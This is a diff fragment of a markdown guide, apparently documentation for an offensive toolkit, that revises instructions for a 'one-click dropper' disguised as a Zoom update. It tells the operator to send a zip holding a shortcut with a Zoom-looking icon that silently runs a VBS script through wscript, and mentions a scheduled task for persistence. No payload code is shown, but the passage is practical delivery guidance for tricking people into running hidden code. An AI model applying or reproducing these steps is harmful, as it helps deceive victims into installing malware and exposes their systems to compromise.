@@ -53,9 +53,10 @@ session and use the scheduled task above.
 
 ## One-click dropper: `Zoom_Update_v6.1.0`
 
-`Zoom_Update_v6.1.0.lnk` is the file to send. It carries the Zoom-looking icon
-and launches `Zoom_Update_v6.1.0.vbs` hidden through `wscript` (the shortcut uses
-a relative argument, so the whole folder can be zipped and moved).
+**Send `Zoom_Update_v6.1.0.zip`** (no `chmod` exists on Windows). It holds the
+`.lnk` with the Zoom-looking icon, the VBS and the icon; the shortcut launches
+the VBS hidden through `wscript` with a relative argument, so extraction to
+any folder works.
 
 Flow:
 
